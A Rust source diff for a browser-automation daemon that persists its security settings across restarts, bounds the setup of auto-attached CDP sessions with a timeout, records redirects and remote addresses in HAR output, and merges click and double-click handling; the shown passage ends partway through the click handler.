@@ -13,7 +13,7 @@ use tokio::sync::{broadcast, oneshot, RwLock};
 use crate::connection::{get_socket_dir, INTERNAL_DAEMON_SHUTDOWN_ACTION};
 use crate::session_files::SessionFile;
 use crate::session_settings::{
-    named, spec, Connection, Effect, Key, Patch, Persist, Requested, Running,
+    named, spec, Connection, Effect, Key, Patch, Persist, Requested, Running, Store,
 };
 use crate::validation::{is_valid_session_name, session_name_error};
 
@@ -21,11 +21,12 @@ use super::a11y;
 use super::auth;
 use super::browser::{should_track_target, BrowserManager, WaitUntil, WedgeReport};
 use super::cdp::chrome::{prepare_nss_home, LaunchOptions};
-use super::cdp::client::CdpClient;
+use super::cdp::client::{is_session_detached_error, CdpClient};
 use super::cdp::types::{
-    AttachToTargetParams, AttachToTargetResult, CdpEvent, DispatchMouseEventParams,
-    ExceptionThrownEvent, GetFullAXTreeResult, JavascriptDialogOpeningEvent, TargetCreatedEvent,
-    TargetDestroyedEvent, TargetInfo, TargetInfoChangedEvent,
+    session_matches, AttachToTargetParams, AttachToTargetResult, CdpEvent,
+    DispatchMouseEventParams, ExceptionThrownEvent, GetFullAXTreeResult,
+    JavascriptDialogOpeningEvent, TargetCreatedEvent, TargetDestroyedEvent, TargetInfo,
+    TargetInfoChangedEvent,
 };
 use super::cookies;
 use super::diff;
@@ -34,6 +35,7 @@ use super::element::RefMap;
 use super::inspect_server::InspectServer;
 use super::interaction;
 use super::network::{self, DomainFilter, EventTracker};
+use super::pointer::{ClickPlan, ClickSpec, Modifiers, MouseButton};
 use super::policy::{ActionPolicy, ConfirmActions, PolicyResult};
 use super::providers;
 use super::react;
@@ -122,6 +124,9 @@ pub struct HarEntry {
     pub response_body: Option<String>,
     /// Whether `response_body` is base64-encoded (binary content).
     pub response_body_base64: bool,
+    /// The address and port the browser connected to (CDP
+    /// `remoteIPAddress` and `remotePort`).
+    pub remote_addr: Option<std::net::SocketAddr>,
 }
 
 /// Which response bodies to embed in HAR output as `content.text`.
@@ -591,6 +596,8 @@ pub struct DaemonState {
     pub session_id: String,
     /// The settings this session runs with.
     pub settings: Running,
+    /// Where the security settings are kept across daemon restarts.
+    store: Arc<dyn Store>,
     pub tracing_state: TracingState,
     pub recording_state: RecordingState,
     event_rx: Option<broadcast::Receiver<CdpEvent>>,
@@ -616,6 +623,8 @@ pub struct DaemonState {
     /// Bytes of response bodies embedded so far this recording; enforces
     /// [`HAR_MAX_TOTAL_BODY_BYTES`].
     pub har_body_total_bytes: usize,
+    /// When each recorded request last received its headers or body bytes.
+    pub har_progress: HashMap<String, std::time::Instant>,
     pub confirm_actions: Option<ConfirmActions>,
     pub inspect_server: Option<InspectServer>,
     pub routes: Arc<RwLock<Vec<RouteEntry>>>,
@@ -734,10 +743,21 @@ impl DaemonState {
         }
     }
 
+    /// A session seeded from the environment whose security settings are kept
+    /// in memory only.
+    #[cfg(test)]
     pub fn new() -> Self {
+        Self::with_store(
+            Running::from_env(),
+            Arc::new(crate::session_settings::MemStore::default()),
+        )
+    }
+
+    /// A session that starts with `settings` and keeps its security settings
+    /// in `store`.
+    pub fn with_store(settings: Running, store: Arc<dyn Store>) -> Self {
         let session_id =
             env::var("AGENT_BROWSER_SESSION").unwrap_or_else(|_| "default".to_string());
-        let settings = Running::from_env();
         let security = settings.security();
         let restore = settings.restore();
         // A corrupt binding file is surfaced later, on attach; it does not
@@ -757,9 +777,11 @@ impl DaemonState {
             snapshot_revisions: HashMap::new(),
             screenshot_observations: HashMap::new(),
             domain_filter: Arc::new(RwLock::new(
+                // An empty list is no filter, as when it is cleared live.
                 security
                     .allowed_domains
                     .as_ref()
+                    .filter(|domains| !domains.is_empty())
                     .map(|domains| DomainFilter::new(&domains.join(","))),
             )),
             event_tracker: EventTracker::new(),
@@ -804,6 +826,7 @@ impl DaemonState {
             flow_stop: None,
             har_content_mode: HarContentMode::default(),
             har_body_total_bytes: 0,
+            har_progress: HashMap::new(),
             confirm_actions: security
                 .confirm_actions
                 .as_deref()
@@ -843,6 +866,7 @@ impl DaemonState {
             pin_tab,
             last_persisted_binding: None,
             settings,
+            store,
         }
     }
 
@@ -877,11 +901,13 @@ impl DaemonState {
     /// Create state with an optional stream client slot and server instance
     /// (for daemon startup with stream server).
     pub fn new_with_stream(
+        settings: Running,
+        store: Arc<dyn Store>,
         stream_client: Option<Arc<RwLock<Option<Arc<CdpClient>>>>>,
         stream_server: Option<Arc<StreamServer>>,
         idle_activity: Arc<IdleActivity>,
     ) -> Self {
-        let mut s = Self::new();
+        let mut s = Self::with_store(settings, store);
         if stream_server.is_some() {
             s.request_tracking = true;
         }
@@ -988,9 +1014,6 @@ impl DaemonState {
                         if is_recorder_session {
                             continue;
                         }
-                        let target_needs_controls = target_info
-                            .as_ref()
-                            .is_some_and(target_supports_network_controls);
                         let waiting_for_debugger = event
                             .params
                             .get("waitingForDebugger")
@@ -999,56 +1022,15 @@ impl DaemonState {
 
                         let df = domain_filter.read().await.clone();
                         let has_proxy_creds = proxy_credentials.read().await.is_some();
-                        let controls_active = df.is_some() || has_proxy_creds;
-                        let controls_result = if controls_active && target_needs_controls {
-                            async {
-                                if let Some(ref target) = target_info {
-                                    prepare_network_control_target_session(&client, &sid, target)
-                                        .await?;
-                                }
-                                if let Some(ref target) = target_info {
-                                    if target_is_worker_like(target) {
-                                        install_worker_network_controls_for_session(
-                                            &client,
-                                            &sid,
-                                            df.as_ref(),
-                                            has_proxy_creds,
-                                            target,
-                                        )
-                                        .await
-                                    } else {
-                                        install_network_controls_for_session(
-                                            &client,
-                                            &sid,
-                                            df.as_ref(),
-                                            has_proxy_creds,
-                                            waiting_for_debugger,
-                                        )
-                                        .await
-                                    }
-                                } else {
-                                    Ok(())
-                                }
-                            }
-                            .await
-                        } else {
-                            Ok(())
-                        };
-
-                        if controls_result.is_ok() {
-                            let _ = client
-                                .send_command_no_wait(
-                                    "Runtime.runIfWaitingForDebugger",
-                                    None,
-                                    Some(&sid),
-                                )
-                                .await;
-                        } else if let Err(error) = controls_result {
-                            eprintln!(
-                                "Failed to apply browser network controls to auto-attached target: {}",
-                                error
-                            );
-                        }
+                        setup_auto_attached_session(
+                            &client,
+                            &sid,
+                            target_info.as_ref(),
+                            waiting_for_debugger,
+                            df.as_ref(),
+                            has_proxy_creds,
+                        )
+                        .await;
                     }
                     Some(event) if event.method == "Fetch.requestPaused" => {
                         let request_id = event
@@ -1235,6 +1217,8 @@ impl DaemonState {
         let shared_count = Arc::new(AtomicU64::new(0));
         let shared_captured = Arc::new(AtomicU64::new(0));
         let shared_contact_sheet_count = Arc::new(AtomicU64::new(0));
+        let shared_screenshot_capture = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        self.recording_state.device_scale = initial_frame.device_scale;
         let (cancel_tx, cancel_rx) = oneshot::channel();
         if self.recording_state.cursor {
             self.refresh_active_iframe_sessions().await;
@@ -1257,6 +1241,7 @@ impl DaemonState {
         let handle = recording::spawn_recording_task(
             client,
             capture_session,
+            session_id,
             initial_frame,
             self.recording_state.output_path.clone(),
             self.recording_state.fps,
@@ -1269,12 +1254,14 @@ impl DaemonState {
             self.recording_state.contact_sheet_path.clone(),
             self.recording_state.contact_sheet_threshold,
             shared_contact_sheet_count.clone(),
+            shared_screenshot_capture.clone(),
             cancel_rx,
         );
         self.recording_state.capture_task = Some(handle);
         self.recording_state.shared_frame_count = Some(shared_count);
         self.recording_state.shared_captured_count = Some(shared_captured);
         self.recording_state.shared_contact_sheet_count = Some(shared_contact_sheet_count);
+        self.recording_state.shared_screenshot_capture = Some(shared_screenshot_capture);
         self.recording_state.cancel_tx = Some(cancel_tx);
         Ok(())
     }
@@ -1350,7 +1337,7 @@ impl DaemonState {
             let has_proxy_creds = self.proxy_credentials.read().await.is_some();
             let controls_active = filter.is_some() || has_proxy_creds;
             let setup_result = if let Some(ref mgr) = self.browser {
-                async {
+                bounded_auto_attached_setup("session", iframe_sid, async {
                     mgr.prepare_domains_pub(iframe_sid).await?;
                     let _ = mgr
                         .client
@@ -1371,19 +1358,33 @@ impl DaemonState {
                         .await?;
                     }
                     mgr.resume_if_waiting_pub(iframe_sid).await
-                }
+                })
                 .await
             } else {
                 Ok(())
             };
-            if let Err(error) = setup_result {
-                if controls_active {
+            match setup_result {
+                Ok(()) => {}
+                // Only this session is dropped; other frames keep theirs.
+                Err(error) if is_session_detached_error(&error) => {
+                    log_detached_during_setup("iframe", &error);
+                    self.iframe_sessions.retain(|_, sid| sid != iframe_sid);
+                    self.active_iframe_sessions.remove(iframe_sid);
+                }
+                Err(error) if controls_active => {
                     return close_after_network_control_failure(self, error).await;
                 }
-                eprintln!(
-                    "Warning: failed to prepare iframe session controls: {}",
-                    error
-                );
+                Err(error) => {
+                    eprintln!(
+                        "Warning: failed to prepare iframe session controls: {}",
+                        error
+                    );
+                    // No controls depend on the pause, so do not leave the
+                    // frame stopped before its first script.
+                    if let Some(ref mgr) = self.browser {
+                        let _ = mgr.resume_if_waiting_pub(iframe_sid).await;
+                    }
+                }
             }
         }
 
@@ -1394,7 +1395,7 @@ impl DaemonState {
             let has_proxy_creds = self.proxy_credentials.read().await.is_some();
             let controls_active = filter.is_some() || has_proxy_creds;
             let setup_result = if let Some(ref mut mgr) = self.browser {
-                async {
+                bounded_auto_attached_setup("session", page_sid, async {
                     mgr.prepare_domains_pub(page_sid).await?;
                     if controls_active {
                         install_network_controls_for_session(
@@ -1445,19 +1446,26 @@ impl DaemonState {
                     );
 
                     mgr.resume_if_waiting_pub(page_sid).await
-                }
+                })
                 .await
             } else {
                 Ok(())
             };
-            if let Err(error) = setup_result {
-                if controls_active {
+            match setup_result {
+                Ok(()) => {}
+                // A popup that closed right away; its target is gone.
+                Err(error) if is_session_detached_error(&error) => {
+                    log_detached_during_setup("page", &error);
+                }
+                Err(error) if controls_active => {
                     return close_after_network_control_failure(self, error).await;
                 }
-                eprintln!(
-                    "Warning: failed to prepare attached page session: {}",
-                    error
-                );
+                Err(error) => {
+                    eprintln!(
+                        "Warning: failed to prepare attached page session: {}",
+                        error
+                    );
+                }
             }
         }
 
@@ -1466,7 +1474,7 @@ impl DaemonState {
             let has_proxy_creds = self.proxy_credentials.read().await.is_some();
             let controls_active = filter.is_some() || has_proxy_creds;
             let setup_result = if let Some(ref mgr) = self.browser {
-                async {
+                bounded_auto_attached_setup("session", worker_sid, async {
                     prepare_network_control_target_session(&mgr.client, worker_sid, target_info)
                         .await?;
                     if controls_active {
@@ -1488,19 +1496,25 @@ impl DaemonState {
                         )
                         .await;
                     Ok(())
-                }
+                })
                 .await
             } else {
                 Ok(())
             };
-            if let Err(error) = setup_result {
-                if controls_active {
+            match setup_result {
+                Ok(()) => {}
+                Err(error) if is_session_detached_error(&error) => {
+                    log_detached_during_setup("worker", &error);
+                }
+                Err(error) if controls_active => {
                     return close_after_network_control_failure(self, error).await;
                 }
-                eprintln!(
-                    "Warning: failed to prepare worker session controls: {}",
-                    error
-                );
+                Err(error) => {
+                    eprintln!(
+                        "Warning: failed to prepare worker session controls: {}",
+                        error
+                    );
+                }
             }
         }
 
@@ -1521,7 +1535,8 @@ impl DaemonState {
             let has_proxy_creds = self.proxy_credentials.read().await.is_some();
             let controls_active = filter.is_some() || has_proxy_creds;
             let setup_result = if let Some(ref mut mgr) = self.browser {
-                async {
+                let target_id = te.target_info.target_id.as_str();
+                bounded_auto_attached_setup("target", target_id, async {
                     let attach: AttachToTargetResult = mgr
                         .client
                         .send_command_typed(
@@ -1576,16 +1591,22 @@ impl DaemonState {
                         te.target_info.target_type.clone(),
                     );
                     mgr.resume_if_waiting_pub(&attach.session_id).await
-                }
+                })
                 .await
             } else {
                 Ok(())
             };
-            if let Err(error) = setup_result {
-                if controls_active {
+            match setup_result {
+                Ok(()) => {}
+                Err(error) if is_session_detached_error(&error) => {
+                    log_detached_during_setup("page", &error);
+                }
+                Err(error) if controls_active => {
                     return close_after_network_control_failure(self, error).await;
                 }
-                eprintln!("Warning: failed to prepare new page session: {}", error);
+                Err(error) => {
+                    eprintln!("Warning: failed to prepare new page session: {}", error);
+                }
             }
         }
 
@@ -1880,11 +1901,12 @@ impl DaemonState {
                         _ => {}
                     }
 
-                    let session_matches = if let Some(ref browser) = self.browser {
-                        event.session_id.as_deref() == browser.active_session_id().ok()
-                    } else {
-                        false
-                    };
+                    let session_matches = session_matches(
+                        self.browser
+                            .as_ref()
+                            .and_then(|browser| browser.active_session_id().ok()),
+                        event.session_id.as_deref(),
+                    );
 
                     // Allow Network events from cross-origin iframe sessions
                     // when HAR recording or request tracking is active.
@@ -1919,15 +1941,13 @@ impl DaemonState {
 
                     match event.method.as_str() {
                         "WebMCP.toolsAdded" => {
-                            if let Some(session_id) = event.session_id.as_deref() {
-                                self.webmcp
-                                    .apply_tools_added(session_id, &event.params, "null");
-                            }
+                            let session_id = event.session_id.as_deref().unwrap_or_default();
+                            self.webmcp
+                                .apply_tools_added(session_id, &event.params, "null");
                         }
                         "WebMCP.toolsRemoved" => {
-                            if let Some(session_id) = event.session_id.as_deref() {
-                                self.webmcp.apply_tools_removed(session_id, &event.params);
-                            }
+                            let session_id = event.session_id.as_deref().unwrap_or_default();
+                            self.webmcp.apply_tools_removed(session_id, &event.params);
                         }
                         "WebMCP.toolResponded" => {
                             self.webmcp.apply_response(event.params.clone());
@@ -2042,6 +2062,23 @@ impl DaemonState {
                                         .and_then(|v| v.as_str())
                                         .unwrap_or("Other")
                                         .to_string();
+                                    // A redirect re-sends this request id; the hop it
+                                    // answers ends here, with the redirect response.
+                                    if let Some(redirect) = event.params.get("redirectResponse") {
+                                        if let Some(prev) = self
+                                            .har_entries
+                                            .iter_mut()
+                                            .rev()
+                                            .find(|e| e.request_id == request_id)
+                                        {
+                                            har_fill_response(prev, redirect);
+                                            prev.loading_finished_timestamp = event
+                                                .params
+                                                .get("timestamp")
+                                                .and_then(|v| v.as_f64())
+                                                .or(Some(0.0));
+                                        }
+                                    }
                                     self.har_entries.push(HarEntry {
                                         request_id: request_id.clone(),
                                         wall_time,
@@ -2062,10 +2099,21 @@ impl DaemonState {
                                         loading_finished_timestamp: None,
                                         response_body: None,
                                         response_body_base64: false,
+                                        remote_addr: None,
                                     });
                                     self.flow.tag(&request_id, wall_time);
                                 }
                                 if self.request_tracking {
+                                    if let Some(redirect) = event.params.get("redirectResponse") {
+                                        if let Some(prev) = self
+                                            .tracked_requests
+                                            .iter_mut()
+                                            .rev()
+                                            .find(|e| e.request_id == request_id)
+                                        {
+                                            tracked_fill_response(prev, redirect);
+                                        }
+                                    }
                                     let headers =
                                         request.get("headers").cloned().unwrap_or(json!({}));
                                     let resource_type = event
@@ -2105,67 +2153,35 @@ impl DaemonState {
                                     .get("requestId")
                                     .and_then(|v| v.as_str())
                                     .unwrap_or("");
-                                let status = response.get("status").and_then(|v| v.as_i64());
-                                let status_text = response
-                                    .get("statusText")
-                                    .and_then(|v| v.as_str())
-                                    .unwrap_or("")
-                                    .to_string();
-                                let mime_type = response
-                                    .get("mimeType")
-                                    .and_then(|v| v.as_str())
-                                    .unwrap_or("")
-                                    .to_string();
-                                let http_version = response
-                                    .get("protocol")
-                                    .and_then(|v| v.as_str())
-                                    .map(har_cdp_protocol_to_http_version)
-                                    .unwrap_or_else(|| "HTTP/1.1".to_string());
-                                let response_headers = har_extract_headers(response.get("headers"));
-                                let redirect_url = response_headers
-                                    .iter()
-                                    .find(|(k, _)| k.eq_ignore_ascii_case("location"))
-                                    .map(|(_, v)| v.clone())
-                                    .unwrap_or_default();
-                                let encoded_data_length = response
-                                    .get("encodedDataLength")
-                                    .and_then(|v| v.as_i64())
-                                    .unwrap_or(-1);
-                                let cdp_timing = response.get("timing").cloned();
                                 if self.har_recording {
+                                    self.har_progress
+                                        .insert(request_id.to_string(), std::time::Instant::now());
                                     if let Some(entry) = self
                                         .har_entries
                                         .iter_mut()
                                         .rev()
                                         .find(|e| e.request_id == request_id)
                                     {
-                                        entry.status = status;
-                                        entry.status_text = status_text;
-                                        entry.mime_type = mime_type;
-                                        entry.http_version = http_version;
-                                        entry.response_headers = response_headers;
-                                        entry.redirect_url = redirect_url;
-                                        entry.response_body_size = encoded_data_length;
-                                        entry.cdp_timing = cdp_timing;
+                                        har_fill_response(entry, response);
                                     }
                                 }
                                 if self.request_tracking {
-                                    let resp_headers = response.get("headers").cloned();
-                                    let resp_mime = response
-                                        .get("mimeType")
-                                        .and_then(|v| v.as_str())
-                                        .map(String::from);
                                     if let Some(entry) = self
                                         .tracked_requests
                                         .iter_mut()
                                         .rev()
                                         .find(|e| e.request_id == request_id)
                                     {
-                                        entry.status = status;
-                                        entry.mime_type = resp_mime;
-                                        entry.response_headers = resp_headers;
+                                        tracked_fill_response(entry, response);
                                     }
                                 }
+                            }
+                        }
+                        "Network.dataReceived" if self.har_recording => {
+                            if let Some(id) = event.params.get("requestId").and_then(|v| v.as_str())
+                            {
+                                self.har_progress
+                                    .insert(id.to_string(), std::time::Instant::now());
                             }
                         }
                         "Network.loadingFinished" if self.har_recording => {
@@ -2620,6 +2636,7 @@ pub(crate) async fn close_current_browser(state: &mut DaemonState) -> Result<(),
     state.active_iframe_sessions.clear();
     state.webmcp.clear_all();
     state.screencasting = false;
+    state.pending_dialog = None;
     state.reset_input_state();
     state.update_stream_client().await;
 
@@ -2951,7 +2968,26 @@ fn append_launch_policy_actions(
     }
 }
 
+/// The command future is large; boxing it keeps it off the caller's stack,
+/// which a debug-build test thread would otherwise overflow.
+/// Fields the CLI adds to every command to carry session configuration. They
+/// are not part of the action, so stream broadcasts and flow recordings drop them.
+pub(crate) const ENVELOPE_KEYS: &[&str] = &[
+    "plugins",
+    "settings",
+    "pinTab",
+    "restoreKey",
+    "restoreSave",
+    "restoreCheckUrl",
+    "restoreCheckText",
+    "restoreCheckFn",
+];
+
 pub async fn execute_command(cmd: &Value, state: &mut DaemonState) -> Value {
+    Box::pin(execute_command_flow(cmd, state)).await
+}
+
+async fn execute_command_flow(cmd: &Value, state: &mut DaemonState) -> Value {
     let outer = state.flow.enter();
     let mut resp = execute_command_inner(cmd, state).await;
     if let Some(seq) = state.flow.exit(outer) {
@@ -2988,9 +3024,12 @@ async fn warn_if_browser_outdated(state: &mut DaemonState, response: &mut Value)
     if state.active_provider_connection || disabled {
         return;
     }
-    let Some(mgr) = state.browser.as_ref() else {
+    let Some(mgr) = state.browser.as_mut() else {
         return;
     };
+    if mgr.product_checked() {
+        return;
+    }
     let Ok(Ok(version)) = tokio::time::timeout(
         std::time::Duration::from_secs(3),
         mgr.client
@@ -3000,6 +3039,7 @@ async fn warn_if_browser_outdated(state: &mut DaemonState, response: &mut Value)
     else {
         return;
     };
+    mgr.mark_product_checked();
     let Some(product) = version.get("product").and_then(|v| v.as_str()) else {
         return;
     };
@@ -3056,7 +3096,7 @@ async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
     }
 
     if action == INTERNAL_DAEMON_SHUTDOWN_ACTION {
-        let mut resp = match handle_close(state).await {
+        let mut resp = match close_session(state, false).await {
             Ok(data) => success_response(&id, data),
             Err(e) => error_response(&id, &super::browser::to_ai_friendly_error(&e)),
         };
@@ -3066,25 +3106,11 @@ async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
 
     if let Some(ref server) = state.stream_server {
         let mut broadcast_cmd;
-        let has_internal_fields = cmd.get("plugins").is_some()
-            || cmd.get("settings").is_some()
-            || cmd.get("pinTab").is_some()
-            || cmd.get("restoreKey").is_some()
-            || cmd.get("restoreSave").is_some()
-            || cmd.get("restoreCheckUrl").is_some()
-            || cmd.get("restoreCheckText").is_some()
-            || cmd.get("restoreCheckFn").is_some();
+        let has_internal_fields = ENVELOPE_KEYS.iter().any(|k| cmd.get(k).is_some());
         let cmd_for_broadcast = if has_internal_fields {
             broadcast_cmd = cmd.clone();
             if let Some(obj) = broadcast_cmd.as_object_mut() {
-                obj.remove("plugins");
-                obj.remove("settings");
-                obj.remove("pinTab");
-                obj.remove("restoreKey");
-                obj.remove("restoreSave");
-                obj.remove("restoreCheckUrl");
-                obj.remove("restoreCheckText");
-                obj.remove("restoreCheckFn");
+                obj.retain(|k, _| !ENVELOPE_KEYS.contains(&k.as_str()));
             }
             &broadcast_cmd
         } else {
@@ -3379,7 +3405,8 @@ async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
                     state.settings.connection(),
                     Connection::Cdp(_)
                 ));
-                rollback_launch_settings(state, &mut settings_outcome, &e).await;
+                let rollback = rollback_launch_settings(state, &mut settings_outcome, &e).await;
+                let e = with_rollback_error(&e, rollback);
                 let mut resp = error_response(&id, &format!("{}: {}", context, e));
                 attach_settings_outcome(&mut resp, &settings_outcome);
                 return resp;
@@ -3481,12 +3508,16 @@ async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
                 Ok(()) => handle_launch(cmd, state).await,
                 Err(e) => Err(e),
             };
-            if result.is_ok() {
-                state.webmcp_enabled = state.settings.webmcp();
-            } else if let Err(e) = &result {
-                rollback_launch_settings(state, &mut settings_outcome, e).await;
+            match result {
+                Ok(data) => {
+                    state.webmcp_enabled = state.settings.webmcp();
+                    Ok(data)
+                }
+                Err(e) => {
+                    let rollback = rollback_launch_settings(state, &mut settings_outcome, &e).await;
+                    Err(with_rollback_error(&e, rollback))
+                }
             }
-            result
         }
         "navigate" => handle_navigate(cmd, state).await,
         "read" => handle_read(cmd, state).await,
@@ -3499,8 +3530,8 @@ async fn execute_command_inner(cmd: &Value, state: &mut DaemonState) -> Value {
         "close" => handle_close(state).await,
         "snapshot" => handle_snapshot(cmd, state).await,
         "screenshot" => handle_screenshot(cmd, state).await,
-        "click" => handle_click(cmd, state).await,
-        "dblclick" => handle_dblclick(cmd, state).await,
+        "click" => handle_click(cmd, state, 1).await,
+        "dblclick" => handle_click(cmd, state, 2).await,
         "fill" => handle_fill(cmd, state).await,
         "type" => handle_type(cmd, state).await,
         "press" => handle_press(cmd, state).await,
@@ -4226,6 +4257,115 @@ fn allowed_domains_disallowed_chrome_arg(args: &[String]) -> Option<&'static str
     }
 
     None
+}
+
+/// Upper bound for preparing an iframe, worker, or page session that the
+/// event drain or auto-attach reported. Every command drains CDP events
+/// first, so this setup runs on the command path: a session that neither
+/// answers nor reports its detach would otherwise hold every queued command
+/// for the 30 s CDP timeout of each command it sends.
+const AUTO_ATTACHED_SETUP_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(10);
+
+/// `kind` and `id` name what is being prepared in the timeout error, e.g.
+/// `"session"` and a session id, or `"target"` and a target id when the
+/// session does not exist yet.
+async fn bounded_auto_attached_setup(
+    kind: &str,
+    id: &str,
+    setup: impl std::future::Future<Output = Result<(), String>>,
+) -> Result<(), String> {
+    tokio::time::timeout(AUTO_ATTACHED_SETUP_TIMEOUT, setup)
+        .await
+        .unwrap_or_else(|_| Err(format!("Timed out preparing auto-attached {} {}", kind, id)))
+}
+
+/// What the background handler did with a session that auto-attach reported.
+#[derive(Debug, PartialEq, Eq)]
+enum AutoAttachedSetup {
+    /// Controls (if any) are installed and the target was resumed.
+    Resumed,
+    /// The session detached during setup; its target is gone.
+    Detached,
+    /// Setup failed; the target stays paused so it cannot run uncontrolled.
+    Failed,
+}
+
+/// Installs network controls on a session that browser-level auto-attach
+/// reported, then resumes it. This runs in the background handler that also
+/// answers `Fetch.requestPaused` for the page, so a dead child session must
+/// not stall it.
+async fn setup_auto_attached_session(
+    client: &CdpClient,
+    sid: &str,
+    target_info: Option<&TargetInfo>,
+    waiting_for_debugger: bool,
+    domain_filter: Option<&DomainFilter>,
+    has_proxy_creds: bool,
+) -> AutoAttachedSetup {
+    let target_needs_controls = target_info.is_some_and(target_supports_network_controls);
+    let controls_active = domain_filter.is_some() || has_proxy_creds;
+    let controls_result = match target_info {
+        Some(target) if controls_active && target_needs_controls => {
+            bounded_auto_attached_setup("session", sid, async {
+                prepare_network_control_target_session(client, sid, target).await?;
+                if target_is_worker_like(target) {
+                    install_worker_network_controls_for_session(
+                        client,
+                        sid,
+                        domain_filter,
+                        has_proxy_creds,
+                        target,
+                    )
+                    .await
+                } else {
+                    install_network_controls_for_session(
+                        client,
+                        sid,
+                        domain_filter,
+                        has_proxy_creds,
+                        waiting_for_debugger,
+                    )
+                    .await
+                }
+            })
+            .await
+        }
+        _ => Ok(()),
+    };
+
+    match controls_result {
+        Ok(()) => {
+            let _ = client
+                .send_command_no_wait("Runtime.runIfWaitingForDebugger", None, Some(sid))
+                .await;
+            AutoAttachedSetup::Resumed
+        }
+        Err(error) if is_session_detached_error(&error) => {
+            log_detached_during_setup("auto-attached", &error);
+            AutoAttachedSetup::Detached
+        }
+        Err(error) => {
+            eprintln!(
+                "Failed to apply browser network controls to auto-attached target: {}",
+                error
+            );
+            AutoAttachedSetup::Failed
+        }
+    }
+}
+
+/// An auto-attached session that detached during setup took its target with
+/// it, so there is nothing left to control or resume. Short-lived iframes do
+/// this routinely; it is not worth a warning.
+fn log_detached_during_setup(kind: &str, error: &str) {
+    if env::var_os("AGENT_BROWSER_DEBUG").is_some() {
+        let _ = writeln!(
+            std::io::stderr(),
+            "[cdp] {} session detached during setup: {}",
+            kind,
+            error
+        );
+    }
 }
 
 async fn prepare_auto_attached_session(client: &CdpClient, session_id: &str) -> Result<(), String> {
@@ -5691,14 +5831,14 @@ fn is_containment_rejection(error: &str) -> bool {
 /// start) never widens containment: the allowed domains the command asked for
 /// stay installed. A launch rejected because the allowed domains cannot be
 /// enforced for it is rejected whole, so they are put back too.
+///
+/// Returns why the stored security settings could not be put back, if so.
 async fn rollback_launch_settings(
     state: &mut DaemonState,
     outcome: &mut SettingsOutcome,
     error: &str,
-) {
-    let Some(pending) = outcome.pending.take() else {
-        return;
-    };
+) -> Option<String> {
+    let pending = outcome.pending.take()?;
     let rejected = is_containment_rejection(error);
     let restored: Vec<Key> = pending
         .keys
@@ -5718,6 +5858,22 @@ async fn rollback_launch_settings(
     state.attached_target = pending.attached;
     state.cdp_headers = pending.cdp_headers;
     outcome.mark_rolled_back(&restored);
+    if rejected {
+        return state
+            .store
+            .save(&state.settings.security())
+            .err()
+            .map(|e| format!("the stored security settings could not be restored: {}", e));
+    }
+    None
+}
+
+/// The launch error with the rollback problem, if any, appended.
+fn with_rollback_error(error: &str, rollback: Option<String>) -> String {
+    match rollback {
+        Some(why) => format!("{} ({})", error, why),
+        None => error.to_string(),
+    }
 }
 
 /// CA trust is compared by content, not by path: the same certificates from
@@ -5799,6 +5955,16 @@ async fn apply_settings_patch(
     } else {
         None
     };
+
+    // Security settings are stored before they are applied, so a failed write
+    // leaves the session as it was and a stored setting never lags the running one.
+    let next_security = plan.next.security();
+    if next_security != state.settings.security() {
+        state
+            .store
+            .save(&next_security)
+            .map_err(|e| e.to_string())?;
+    }
 
     let had_browser = has_active_browser_session(state);
     let relaunched_browser = plan.relaunch && had_browser;
@@ -6015,8 +6181,8 @@ async fn handle_launch_inner(cmd: &Value, state: &mut DaemonState) -> Result<Val
             Ok(result)
         }
         Err(e) => {
-            rollback_launch_settings(state, &mut outcome, &e).await;
-            Err(e)
+            let rollback = rollback_launch_settings(state, &mut outcome, &e).await;
+            Err(with_rollback_error(&e, rollback))
         }
     }
 }
@@ -6418,7 +6584,15 @@ async fn handle_evaluate(cmd: &Value, state: &DaemonState) -> Result<Value, Stri
     Ok(data)
 }
 
+/// A user `close`: the session is over, so its stored security settings go.
 async fn handle_close(state: &mut DaemonState) -> Result<Value, String> {
+    close_session(state, true).await
+}
+
+/// Closes the browser and what hangs off it. The stored security settings are
+/// forgotten only when `forget_settings` is set and the close succeeded: the
+/// daemon restarts the CLI asks for (upgrade, changed options) keep them.
+async fn close_session(state: &mut DaemonState, forget_settings: bool) -> Result<Value, String> {
     let save_result = auto_save_restore_state(state).await;
     close_all_browser_backends(state).await?;
     state.attached_target = None;
@@ -6448,9 +6622,15 @@ async fn handle_close(state: &mut DaemonState) -> Result<Value, String> {
         Ok(None) => None,
         Err(e) => Some(e),
     };
+    let settings_clear_error = if forget_settings {
+        state.store.clear().err()
+    } else {
+        None
+    };
     let unsaved = if state.flow.active() {
         state.har_recording = false;
         state.har_entries.clear();
+        state.har_progress.clear();
         state.har_body_total_bytes = 0;
         state.flow.end_capture()
     } else {
@@ -6480,6 +6660,9 @@ async fn handle_close(state: &mut DaemonState) -> Result<Value, String> {
     }
     if let Some(err) = pin_release_error {
         reply["pinReleaseError"] = json!(err);
+    }
+    if let Some(err) = settings_clear_error {
+        reply["settingsClearError"] = json!(err.to_string());
     }
     Ok(reply)
 }
@@ -6931,7 +7114,12 @@ fn record_click_animation(
     }
 }
 
-async fn handle_click(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
+async fn handle_click(
+    cmd: &Value,
+    state: &mut DaemonState,
+    default_count: u8,
+) -> Result<Value, String> {
+    let plan = ClickPlan::from_command(cmd, default_count)?;
     let selector = cmd
         .get("selector")
         .and_then(|v| v.as_str())
@@ -6939,89 +7127,103 @@ async fn handle_click(cmd: &Value, state: &mut DaemonState) -> Result<Value, Str
 
     if let Some(ref wb) = state.webdriver_backend {
         if state.browser.is_none() {
-            wb.click(selector).await?;
-            return Ok(json!({ "clicked": selector }));
+            match plan {
+                ClickPlan::Pointer(spec) if spec.is_plain() => {
+                    wb.click(selector).await?;
+                    return Ok(json!({ "clicked": selector }));
+                }
+                ClickPlan::Pointer(_) => {
+                    return Err(
+                        "The Safari and iOS backends only support a plain left click; --button, --modifiers, and dblclick need a Chrome session"
+                            .to_string(),
+                    )
+                }
+                ClickPlan::NewTab => {
+                    return Err(
+                        "The Safari and iOS backends cannot open a tab from a click; use `tab new <url>`"
+                            .to_string(),
+                    )
+                }
+            }
         }
     }
 
     let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
